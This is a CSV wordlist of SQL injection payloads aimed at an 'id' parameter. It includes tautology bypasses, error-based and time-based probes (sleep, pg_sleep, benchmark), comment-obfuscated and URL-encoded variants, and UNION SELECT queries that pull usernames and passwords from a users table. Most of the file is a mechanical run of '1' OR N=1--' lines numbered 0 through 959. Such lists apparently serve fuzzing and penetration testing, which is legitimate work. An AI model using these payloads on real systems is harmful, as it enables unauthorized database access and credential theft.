Parameter,Payload
id,' OR '1'='1
id,""" OR ""1""=""1"
id,' OR '1'='1' -- 
id,""" OR ""1""=""1"" -- "
id,') OR ('1'='1
id,""") OR (""1""=""1"
id,') OR '1'='1' -- 
id,""") OR ""1""=""1"" -- "
id,"1' AND 1=CONVERT(int,@@version)--"
id,"1"" AND 1=CONVERT(int,@@version)--"
id,1' AND 1=CAST(version() AS INT)--
id,"1"" AND 1=CAST(version() AS INT)--"
id,1' AND '1'='1
id,"1"" AND ""1""=""1"
id,1' AND '1'='2
id,"1"" AND ""1""=""2"
id,1' OR 'a'='a
id,"1"" OR ""a""=""a"
id,1' AND (SELECT COUNT(*) FROM users) > 0
id,"1"" AND (SELECT COUNT(*) FROM users) > 0"
id,1' OR sleep(5)--
id,"1"" OR sleep(5)--"
id,1' OR pg_sleep(5)--
id,"1"" OR pg_sleep(5)--"
id,"1' OR benchmark(5000000,md5('test'))--"
id,"1"" OR benchmark(5000000,md5(""test""))--"
id,"1' UNION SELECT NULL, NULL--"
id,"1' UNION SELECT username, password FROM users--"
id,"1' UNION SELECT 1, @@version--"
id,"1' UNION SELECT user(), database()--"
id,1' UNION SELECT table_name FROM information_schema.tables--
id,1' OR '1'='1' /* 
id,1' OR '1'='1' # 
id,1' OR '1'='1' -- 
id,1' OR '1'='1' -- -
id,1' OR '1'='1' --+
id,1%27+OR+1%3D1--
id,1%27+OR+%271%27%3D%271%27--+
id,1' /*!50000OR*/ '1'='1
id,"1' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--"
id,"1' /*!50000UNION*/ /*!50000SELECT*/ username,password FROM users--"
id,"1' OR ASCII(SUBSTRING((SELECT database()),1,1))=100"
id,"1' AND 1=2 UNION SELECT 1,2,version()--"
id,1' OR 0=1--
id,1' OR 1=1--
id,1' OR 2=1--
id,1' OR 3=1--
id,1' OR 4=1--
id,1' OR 5=1--
id,1' OR 6=1--
id,1' OR 7=1--
id,1' OR 8=1--
id,1' OR 9=1--
id,1' OR 10=1--
id,1' OR 11=1--
id,1' OR 12=1--
id,1' OR 13=1--
id,1' OR 14=1--
id,1' OR 15=1--
id,1' OR 16=1--
id,1' OR 17=1--
id,1' OR 18=1--
id,1' OR 19=1--
id,1' OR 20=1--
id,1' OR 21=1--
id,1' OR 22=1--
id,1' OR 23=1--
id,1' OR 24=1--
id,1' OR 25=1--
id,1' OR 26=1--
id,1' OR 27=1--
id,1' OR 28=1--
id,1' OR 29=1--
id,1' OR 30=1--
id,1' OR 31=1--
id,1' OR 32=1--
id,1' OR 33=1--
id,1' OR 34=1--
id,1' OR 35=1--
id,1' OR 36=1--
id,1' OR 37=1--
id,1' OR 38=1--
id,1' OR 39=1--
id,1' OR 40=1--
id,1' OR 41=1--
id,1' OR 42=1--
id,1' OR 43=1--
id,1' OR 44=1--
id,1' OR 45=1--
id,1' OR 46=1--
id,1' OR 47=1--
id,1' OR 48=1--
id,1' OR 49=1--
id,1' OR 50=1--
id,1' OR 51=1--
id,1' OR 52=1--
id,1' OR 53=1--
id,1' OR 54=1--
id,1' OR 55=1--
id,1' OR 56=1--
id,1' OR 57=1--
id,1' OR 58=1--
id,1' OR 59=1--
id,1' OR 60=1--
id,1' OR 61=1--
id,1' OR 62=1--
id,1' OR 63=1--
id,1' OR 64=1--
id,1' OR 65=1--
id,1' OR 66=1--
id,1' OR 67=1--
id,1' OR 68=1--
id,1' OR 69=1--
id,1' OR 70=1--
id,1' OR 71=1--
id,1' OR 72=1--
id,1' OR 73=1--
id,1' OR 74=1--
id,1' OR 75=1--
id,1' OR 76=1--
id,1' OR 77=1--
id,1' OR 78=1--
id,1' OR 79=1--
id,1' OR 80=1--
id,1' OR 81=1--
id,1' OR 82=1--
id,1' OR 83=1--
id,1' OR 84=1--
id,1' OR 85=1--
id,1' OR 86=1--
id,1' OR 87=1--
id,1' OR 88=1--
id,1' OR 89=1--
id,1' OR 90=1--
id,1' OR 91=1--
id,1' OR 92=1--
id,1' OR 93=1--
id,1' OR 94=1--
id,1' OR 95=1--
id,1' OR 96=1--
id,1' OR 97=1--
id,1' OR 98=1--
id,1' OR 99=1--
id,1' OR 100=1--
id,1' OR 101=1--
id,1' OR 102=1--
id,1' OR 103=1--
id,1' OR 104=1--
id,1' OR 105=1--
id,1' OR 106=1--
id,1' OR 107=1--
id,1' OR 108=1--
id,1' OR 109=1--
id,1' OR 110=1--
id,1' OR 111=1--
id,1' OR 112=1--
id,1' OR 113=1--
id,1' OR 114=1--
id,1' OR 115=1--
id,1' OR 116=1--
id,1' OR 117=1--
id,1' OR 118=1--
id,1' OR 119=1--
id,1' OR 120=1--
id,1' OR 121=1--
id,1' OR 122=1--
id,1' OR 123=1--
id,1' OR 124=1--
id,1' OR 125=1--
id,1' OR 126=1--
id,1' OR 127=1--
id,1' OR 128=1--
id,1' OR 129=1--
id,1' OR 130=1--
id,1' OR 131=1--
id,1' OR 132=1--
id,1' OR 133=1--
id,1' OR 134=1--
id,1' OR 135=1--
id,1' OR 136=1--
id,1' OR 137=1--
id,1' OR 138=1--
id,1' OR 139=1--
id,1' OR 140=1--
id,1' OR 141=1--
id,1' OR 142=1--
id,1' OR 143=1--
id,1' OR 144=1--
id,1' OR 145=1--
id,1' OR 146=1--
id,1' OR 147=1--
id,1' OR 148=1--
id,1' OR 149=1--
id,1' OR 150=1--
id,1' OR 151=1--
id,1' OR 152=1--
id,1' OR 153=1--
id,1' OR 154=1--
id,1' OR 155=1--
id,1' OR 156=1--
id,1' OR 157=1--
id,1' OR 158=1--
id,1' OR 159=1--
id,1' OR 160=1--
id,1' OR 161=1--
id,1' OR 162=1--
id,1' OR 163=1--
id,1' OR 164=1--
id,1' OR 165=1--
id,1' OR 166=1--
id,1' OR 167=1--
id,1' OR 168=1--
id,1' OR 169=1--
id,1' OR 170=1--
id,1' OR 171=1--
id,1' OR 172=1--
id,1' OR 173=1--
id,1' OR 174=1--
id,1' OR 175=1--
id,1' OR 176=1--
id,1' OR 177=1--
id,1' OR 178=1--
id,1' OR 179=1--
id,1' OR 180=1--
id,1' OR 181=1--
id,1' OR 182=1--
id,1' OR 183=1--
id,1' OR 184=1--
id,1' OR 185=1--
id,1' OR 186=1--
id,1' OR 187=1--
id,1' OR 188=1--
id,1' OR 189=1--
id,1' OR 190=1--
id,1' OR 191=1--
id,1' OR 192=1--
id,1' OR 193=1--
id,1' OR 194=1--
id,1' OR 195=1--
id,1' OR 196=1--
id,1' OR 197=1--
id,1' OR 198=1--
id,1' OR 199=1--
id,1' OR 200=1--
id,1' OR 201=1--
id,1' OR 202=1--
id,1' OR 203=1--
id,1' OR 204=1--
id,1' OR 205=1--
id,1' OR 206=1--
id,1' OR 207=1--
id,1' OR 208=1--
id,1' OR 209=1--
id,1' OR 210=1--
id,1' OR 211=1--
id,1' OR 212=1--
id,1' OR 213=1--
id,1' OR 214=1--
id,1' OR 215=1--
id,1' OR 216=1--
id,1' OR 217=1--
id,1' OR 218=1--
id,1' OR 219=1--
id,1' OR 220=1--
id,1' OR 221=1--
id,1' OR 222=1--
id,1' OR 223=1--
id,1' OR 224=1--
id,1' OR 225=1--
id,1' OR 226=1--
id,1' OR 227=1--
id,1' OR 228=1--
id,1' OR 229=1--
id,1' OR 230=1--
id,1' OR 231=1--
id,1' OR 232=1--
id,1' OR 233=1--
id,1' OR 234=1--
id,1' OR 235=1--
id,1' OR 236=1--
id,1' OR 237=1--
id,1' OR 238=1--
id,1' OR 239=1--
id,1' OR 240=1--
id,1' OR 241=1--
id,1' OR 242=1--
id,1' OR 243=1--
id,1' OR 244=1--
id,1' OR 245=1--
id,1' OR 246=1--
id,1' OR 247=1--
id,1' OR 248=1--
id,1' OR 249=1--
id,1' OR 250=1--
id,1' OR 251=1--
id,1' OR 252=1--
id,1' OR 253=1--
id,1' OR 254=1--
id,1' OR 255=1--
id,1' OR 256=1--
id,1' OR 257=1--
id,1' OR 258=1--
id,1' OR 259=1--
id,1' OR 260=1--
id,1' OR 261=1--
id,1' OR 262=1--
id,1' OR 263=1--
id,1' OR 264=1--
id,1' OR 265=1--
id,1' OR 266=1--
id,1' OR 267=1--
id,1' OR 268=1--
id,1' OR 269=1--
id,1' OR 270=1--
id,1' OR 271=1--
id,1' OR 272=1--
id,1' OR 273=1--
id,1' OR 274=1--
id,1' OR 275=1--
id,1' OR 276=1--
id,1' OR 277=1--
id,1' OR 278=1--
id,1' OR 279=1--
id,1' OR 280=1--
id,1' OR 281=1--
id,1' OR 282=1--
id,1' OR 283=1--
id,1' OR 284=1--
id,1' OR 285=1--
id,1' OR 286=1--
id,1' OR 287=1--
id,1' OR 288=1--
id,1' OR 289=1--
id,1' OR 290=1--
id,1' OR 291=1--
id,1' OR 292=1--
id,1' OR 293=1--
id,1' OR 294=1--
id,1' OR 295=1--
id,1' OR 296=1--
id,1' OR 297=1--
id,1' OR 298=1--
id,1' OR 299=1--
id,1' OR 300=1--
id,1' OR 301=1--
id,1' OR 302=1--
id,1' OR 303=1--
id,1' OR 304=1--
id,1' OR 305=1--
id,1' OR 306=1--
id,1' OR 307=1--
id,1' OR 308=1--
id,1' OR 309=1--
id,1' OR 310=1--
id,1' OR 311=1--
id,1' OR 312=1--
id,1' OR 313=1--
id,1' OR 314=1--
id,1' OR 315=1--
id,1' OR 316=1--
id,1' OR 317=1--
id,1' OR 318=1--
id,1' OR 319=1--
id,1' OR 320=1--
id,1' OR 321=1--
id,1' OR 322=1--
id,1' OR 323=1--
id,1' OR 324=1--
id,1' OR 325=1--
id,1' OR 326=1--
id,1' OR 327=1--
id,1' OR 328=1--
id,1' OR 329=1--
id,1' OR 330=1--
id,1' OR 331=1--
id,1' OR 332=1--
id,1' OR 333=1--
id,1' OR 334=1--
id,1' OR 335=1--
id,1' OR 336=1--
id,1' OR 337=1--
id,1' OR 338=1--
id,1' OR 339=1--
id,1' OR 340=1--
id,1' OR 341=1--
id,1' OR 342=1--
id,1' OR 343=1--
id,1' OR 344=1--
id,1' OR 345=1--
id,1' OR 346=1--
id,1' OR 347=1--
id,1' OR 348=1--
id,1' OR 349=1--
id,1' OR 350=1--
id,1' OR 351=1--
id,1' OR 352=1--
id,1' OR 353=1--
id,1' OR 354=1--
id,1' OR 355=1--
id,1' OR 356=1--
id,1' OR 357=1--
id,1' OR 358=1--
id,1' OR 359=1--
id,1' OR 360=1--
id,1' OR 361=1--
id,1' OR 362=1--
id,1' OR 363=1--
id,1' OR 364=1--
id,1' OR 365=1--
id,1' OR 366=1--
id,1' OR 367=1--
id,1' OR 368=1--
id,1' OR 369=1--
id,1' OR 370=1--
id,1' OR 371=1--
id,1' OR 372=1--
id,1' OR 373=1--
id,1' OR 374=1--
id,1' OR 375=1--
id,1' OR 376=1--
id,1' OR 377=1--
id,1' OR 378=1--
id,1' OR 379=1--
id,1' OR 380=1--
id,1' OR 381=1--
id,1' OR 382=1--
id,1' OR 383=1--
id,1' OR 384=1--
id,1' OR 385=1--
id,1' OR 386=1--
id,1' OR 387=1--
id,1' OR 388=1--
id,1' OR 389=1--
id,1' OR 390=1--
id,1' OR 391=1--
id,1' OR 392=1--
id,1' OR 393=1--
id,1' OR 394=1--
id,1' OR 395=1--
id,1' OR 396=1--
id,1' OR 397=1--
id,1' OR 398=1--
id,1' OR 399=1--
id,1' OR 400=1--
id,1' OR 401=1--
id,1' OR 402=1--
id,1' OR 403=1--
id,1' OR 404=1--
id,1' OR 405=1--
id,1' OR 406=1--
id,1' OR 407=1--
id,1' OR 408=1--
id,1' OR 409=1--
id,1' OR 410=1--
id,1' OR 411=1--
id,1' OR 412=1--
id,1' OR 413=1--
id,1' OR 414=1--
id,1' OR 415=1--
id,1' OR 416=1--
id,1' OR 417=1--
id,1' OR 418=1--
id,1' OR 419=1--
id,1' OR 420=1--
id,1' OR 421=1--
id,1' OR 422=1--
id,1' OR 423=1--
id,1' OR 424=1--
id,1' OR 425=1--
id,1' OR 426=1--
id,1' OR 427=1--
id,1' OR 428=1--
id,1' OR 429=1--
id,1' OR 430=1--
id,1' OR 431=1--
id,1' OR 432=1--
id,1' OR 433=1--
id,1' OR 434=1--
id,1' OR 435=1--
id,1' OR 436=1--
id,1' OR 437=1--
id,1' OR 438=1--
id,1' OR 439=1--
id,1' OR 440=1--
id,1' OR 441=1--
id,1' OR 442=1--
id,1' OR 443=1--
id,1' OR 444=1--
id,1' OR 445=1--
id,1' OR 446=1--
id,1' OR 447=1--
id,1' OR 448=1--
id,1' OR 449=1--
id,1' OR 450=1--
id,1' OR 451=1--
id,1' OR 452=1--
id,1' OR 453=1--
id,1' OR 454=1--
id,1' OR 455=1--
id,1' OR 456=1--
id,1' OR 457=1--
id,1' OR 458=1--
id,1' OR 459=1--
id,1' OR 460=1--
id,1' OR 461=1--
id,1' OR 462=1--
id,1' OR 463=1--
id,1' OR 464=1--
id,1' OR 465=1--
id,1' OR 466=1--
id,1' OR 467=1--
id,1' OR 468=1--
id,1' OR 469=1--
id,1' OR 470=1--
id,1' OR 471=1--
id,1' OR 472=1--
id,1' OR 473=1--
id,1' OR 474=1--
id,1' OR 475=1--
id,1' OR 476=1--
id,1' OR 477=1--
id,1' OR 478=1--
id,1' OR 479=1--
id,1' OR 480=1--
id,1' OR 481=1--
id,1' OR 482=1--
id,1' OR 483=1--
id,1' OR 484=1--
id,1' OR 485=1--
id,1' OR 486=1--
id,1' OR 487=1--
id,1' OR 488=1--
id,1' OR 489=1--
id,1' OR 490=1--
id,1' OR 491=1--
id,1' OR 492=1--
id,1' OR 493=1--
id,1' OR 494=1--
id,1' OR 495=1--
id,1' OR 496=1--
id,1' OR 497=1--
id,1' OR 498=1--
id,1' OR 499=1--
id,1' OR 500=1--
id,1' OR 501=1--
id,1' OR 502=1--
id,1' OR 503=1--
id,1' OR 504=1--
id,1' OR 505=1--
id,1' OR 506=1--
id,1' OR 507=1--
id,1' OR 508=1--
id,1' OR 509=1--
id,1' OR 510=1--
id,1' OR 511=1--
id,1' OR 512=1--
id,1' OR 513=1--
id,1' OR 514=1--
id,1' OR 515=1--
id,1' OR 516=1--
id,1' OR 517=1--
id,1' OR 518=1--
id,1' OR 519=1--
id,1' OR 520=1--
id,1' OR 521=1--
id,1' OR 522=1--
id,1' OR 523=1--
id,1' OR 524=1--
id,1' OR 525=1--
id,1' OR 526=1--
id,1' OR 527=1--
id,1' OR 528=1--
id,1' OR 529=1--
id,1' OR 530=1--
id,1' OR 531=1--
id,1' OR 532=1--
id,1' OR 533=1--
id,1' OR 534=1--
id,1' OR 535=1--
id,1' OR 536=1--
id,1' OR 537=1--
id,1' OR 538=1--
id,1' OR 539=1--
id,1' OR 540=1--
id,1' OR 541=1--
id,1' OR 542=1--
id,1' OR 543=1--
id,1' OR 544=1--
id,1' OR 545=1--
id,1' OR 546=1--
id,1' OR 547=1--
id,1' OR 548=1--
id,1' OR 549=1--
id,1' OR 550=1--
id,1' OR 551=1--
id,1' OR 552=1--
id,1' OR 553=1--
id,1' OR 554=1--
id,1' OR 555=1--
id,1' OR 556=1--
id,1' OR 557=1--
id,1' OR 558=1--
id,1' OR 559=1--
id,1' OR 560=1--
id,1' OR 561=1--
id,1' OR 562=1--
id,1' OR 563=1--
id,1' OR 564=1--
id,1' OR 565=1--
id,1' OR 566=1--
id,1' OR 567=1--
id,1' OR 568=1--
id,1' OR 569=1--
id,1' OR 570=1--
id,1' OR 571=1--
id,1' OR 572=1--
id,1' OR 573=1--
id,1' OR 574=1--
id,1' OR 575=1--
id,1' OR 576=1--
id,1' OR 577=1--
id,1' OR 578=1--
id,1' OR 579=1--
id,1' OR 580=1--
id,1' OR 581=1--
id,1' OR 582=1--
id,1' OR 583=1--
id,1' OR 584=1--
id,1' OR 585=1--
id,1' OR 586=1--
id,1' OR 587=1--
id,1' OR 588=1--
id,1' OR 589=1--
id,1' OR 590=1--
id,1' OR 591=1--
id,1' OR 592=1--
id,1' OR 593=1--
id,1' OR 594=1--
id,1' OR 595=1--
id,1' OR 596=1--
id,1' OR 597=1--
id,1' OR 598=1--
id,1' OR 599=1--
id,1' OR 600=1--
id,1' OR 601=1--
id,1' OR 602=1--
id,1' OR 603=1--
id,1' OR 604=1--
id,1' OR 605=1--
id,1' OR 606=1--
id,1' OR 607=1--
id,1' OR 608=1--
id,1' OR 609=1--
id,1' OR 610=1--
id,1' OR 611=1--
id,1' OR 612=1--
id,1' OR 613=1--
id,1' OR 614=1--
id,1' OR 615=1--
id,1' OR 616=1--
id,1' OR 617=1--
id,1' OR 618=1--
id,1' OR 619=1--
id,1' OR 620=1--
id,1' OR 621=1--
id,1' OR 622=1--
id,1' OR 623=1--
id,1' OR 624=1--
id,1' OR 625=1--
id,1' OR 626=1--
id,1' OR 627=1--
id,1' OR 628=1--
id,1' OR 629=1--
id,1' OR 630=1--
id,1' OR 631=1--
id,1' OR 632=1--
id,1' OR 633=1--
id,1' OR 634=1--
id,1' OR 635=1--
id,1' OR 636=1--
id,1' OR 637=1--
id,1' OR 638=1--
id,1' OR 639=1--
id,1' OR 640=1--
id,1' OR 641=1--
id,1' OR 642=1--
id,1' OR 643=1--
id,1' OR 644=1--
id,1' OR 645=1--
id,1' OR 646=1--
id,1' OR 647=1--
id,1' OR 648=1--
id,1' OR 649=1--
id,1' OR 650=1--
id,1' OR 651=1--
id,1' OR 652=1--
id,1' OR 653=1--
id,1' OR 654=1--
id,1' OR 655=1--
id,1' OR 656=1--
id,1' OR 657=1--
id,1' OR 658=1--
id,1' OR 659=1--
id,1' OR 660=1--
id,1' OR 661=1--
id,1' OR 662=1--
id,1' OR 663=1--
id,1' OR 664=1--
id,1' OR 665=1--
id,1' OR 666=1--
id,1' OR 667=1--
id,1' OR 668=1--
id,1' OR 669=1--
id,1' OR 670=1--
id,1' OR 671=1--
id,1' OR 672=1--
id,1' OR 673=1--
id,1' OR 674=1--
id,1' OR 675=1--
id,1' OR 676=1--
id,1' OR 677=1--
id,1' OR 678=1--
id,1' OR 679=1--
id,1' OR 680=1--
id,1' OR 681=1--
id,1' OR 682=1--
id,1' OR 683=1--
id,1' OR 684=1--
id,1' OR 685=1--
id,1' OR 686=1--
id,1' OR 687=1--
id,1' OR 688=1--
id,1' OR 689=1--
id,1' OR 690=1--
id,1' OR 691=1--
id,1' OR 692=1--
id,1' OR 693=1--
id,1' OR 694=1--
id,1' OR 695=1--
id,1' OR 696=1--
id,1' OR 697=1--
id,1' OR 698=1--
id,1' OR 699=1--
id,1' OR 700=1--
id,1' OR 701=1--
id,1' OR 702=1--
id,1' OR 703=1--
id,1' OR 704=1--
id,1' OR 705=1--
id,1' OR 706=1--
id,1' OR 707=1--
id,1' OR 708=1--
id,1' OR 709=1--
id,1' OR 710=1--
id,1' OR 711=1--
id,1' OR 712=1--
id,1' OR 713=1--
id,1' OR 714=1--
id,1' OR 715=1--
id,1' OR 716=1--
id,1' OR 717=1--
id,1' OR 718=1--
id,1' OR 719=1--
id,1' OR 720=1--
id,1' OR 721=1--
id,1' OR 722=1--
id,1' OR 723=1--
id,1' OR 724=1--
id,1' OR 725=1--
id,1' OR 726=1--
id,1' OR 727=1--
id,1' OR 728=1--
id,1' OR 729=1--
id,1' OR 730=1--
id,1' OR 731=1--
id,1' OR 732=1--
id,1' OR 733=1--
id,1' OR 734=1--
id,1' OR 735=1--
id,1' OR 736=1--
id,1' OR 737=1--
id,1' OR 738=1--
id,1' OR 739=1--
id,1' OR 740=1--
id,1' OR 741=1--
id,1' OR 742=1--
id,1' OR 743=1--
id,1' OR 744=1--
id,1' OR 745=1--
id,1' OR 746=1--
id,1' OR 747=1--
id,1' OR 748=1--
id,1' OR 749=1--
id,1' OR 750=1--
id,1' OR 751=1--
id,1' OR 752=1--
id,1' OR 753=1--
id,1' OR 754=1--
id,1' OR 755=1--
id,1' OR 756=1--
id,1' OR 757=1--
id,1' OR 758=1--
id,1' OR 759=1--
id,1' OR 760=1--
id,1' OR 761=1--
id,1' OR 762=1--
id,1' OR 763=1--
id,1' OR 764=1--
id,1' OR 765=1--
id,1' OR 766=1--
id,1' OR 767=1--
id,1' OR 768=1--
id,1' OR 769=1--
id,1' OR 770=1--
id,1' OR 771=1--
id,1' OR 772=1--
id,1' OR 773=1--
id,1' OR 774=1--
id,1' OR 775=1--
id,1' OR 776=1--
id,1' OR 777=1--
id,1' OR 778=1--
id,1' OR 779=1--
id,1' OR 780=1--
id,1' OR 781=1--
id,1' OR 782=1--
id,1' OR 783=1--
id,1' OR 784=1--
id,1' OR 785=1--
id,1' OR 786=1--
id,1' OR 787=1--
id,1' OR 788=1--
id,1' OR 789=1--
id,1' OR 790=1--
id,1' OR 791=1--
id,1' OR 792=1--
id,1' OR 793=1--
id,1' OR 794=1--
id,1' OR 795=1--
id,1' OR 796=1--
id,1' OR 797=1--
id,1' OR 798=1--
id,1' OR 799=1--
id,1' OR 800=1--
id,1' OR 801=1--
id,1' OR 802=1--
id,1' OR 803=1--
id,1' OR 804=1--
id,1' OR 805=1--
id,1' OR 806=1--
id,1' OR 807=1--
id,1' OR 808=1--
id,1' OR 809=1--
id,1' OR 810=1--
id,1' OR 811=1--
id,1' OR 812=1--
id,1' OR 813=1--
id,1' OR 814=1--
id,1' OR 815=1--
id,1' OR 816=1--
id,1' OR 817=1--
id,1' OR 818=1--
id,1' OR 819=1--
id,1' OR 820=1--
id,1' OR 821=1--
id,1' OR 822=1--
id,1' OR 823=1--
id,1' OR 824=1--
id,1' OR 825=1--
id,1' OR 826=1--
id,1' OR 827=1--
id,1' OR 828=1--
id,1' OR 829=1--
id,1' OR 830=1--
id,1' OR 831=1--
id,1' OR 832=1--
id,1' OR 833=1--
id,1' OR 834=1--
id,1' OR 835=1--
id,1' OR 836=1--
id,1' OR 837=1--
id,1' OR 838=1--
id,1' OR 839=1--
id,1' OR 840=1--
id,1' OR 841=1--
id,1' OR 842=1--
id,1' OR 843=1--
id,1' OR 844=1--
id,1' OR 845=1--
id,1' OR 846=1--
id,1' OR 847=1--
id,1' OR 848=1--
id,1' OR 849=1--
id,1' OR 850=1--
id,1' OR 851=1--
id,1' OR 852=1--
id,1' OR 853=1--
id,1' OR 854=1--
id,1' OR 855=1--
id,1' OR 856=1--
id,1' OR 857=1--
id,1' OR 858=1--
id,1' OR 859=1--
id,1' OR 860=1--
id,1' OR 861=1--
id,1' OR 862=1--
id,1' OR 863=1--
id,1' OR 864=1--
id,1' OR 865=1--
id,1' OR 866=1--
id,1' OR 867=1--
id,1' OR 868=1--
id,1' OR 869=1--
id,1' OR 870=1--
id,1' OR 871=1--
id,1' OR 872=1--
id,1' OR 873=1--
id,1' OR 874=1--
id,1' OR 875=1--
id,1' OR 876=1--
id,1' OR 877=1--
id,1' OR 878=1--
id,1' OR 879=1--
id,1' OR 880=1--
id,1' OR 881=1--
id,1' OR 882=1--
id,1' OR 883=1--
id,1' OR 884=1--
id,1' OR 885=1--
id,1' OR 886=1--
id,1' OR 887=1--
id,1' OR 888=1--
id,1' OR 889=1--
id,1' OR 890=1--
id,1' OR 891=1--
id,1' OR 892=1--
id,1' OR 893=1--
id,1' OR 894=1--
id,1' OR 895=1--
id,1' OR 896=1--
id,1' OR 897=1--
id,1' OR 898=1--
id,1' OR 899=1--
id,1' OR 900=1--
id,1' OR 901=1--
id,1' OR 902=1--
id,1' OR 903=1--
id,1' OR 904=1--
id,1' OR 905=1--
id,1' OR 906=1--
id,1' OR 907=1--
id,1' OR 908=1--
id,1' OR 909=1--
id,1' OR 910=1--
id,1' OR 911=1--
id,1' OR 912=1--
id,1' OR 913=1--
id,1' OR 914=1--
id,1' OR 915=1--
id,1' OR 916=1--
id,1' OR 917=1--
id,1' OR 918=1--
id,1' OR 919=1--
id,1' OR 920=1--
id,1' OR 921=1--
id,1' OR 922=1--
id,1' OR 923=1--
id,1' OR 924=1--
id,1' OR 925=1--
id,1' OR 926=1--
id,1' OR 927=1--
id,1' OR 928=1--
id,1' OR 929=1--
id,1' OR 930=1--
id,1' OR 931=1--
id,1' OR 932=1--
id,1' OR 933=1--
id,1' OR 934=1--
id,1' OR 935=1--
id,1' OR 936=1--
id,1' OR 937=1--
id,1' OR 938=1--
id,1' OR 939=1--
id,1' OR 940=1--
id,1' OR 941=1--
id,1' OR 942=1--
id,1' OR 943=1--
id,1' OR 944=1--
id,1' OR 945=1--
id,1' OR 946=1--
id,1' OR 947=1--
id,1' OR 948=1--
id,1' OR 949=1--
id,1' OR 950=1--
id,1' OR 951=1--
id,1' OR 952=1--
id,1' OR 953=1--
id,1' OR 954=1--
id,1' OR 955=1--
id,1' OR 956=1--
id,1' OR 957=1--
id,1' OR 958=1--
id,1' OR 959=1--
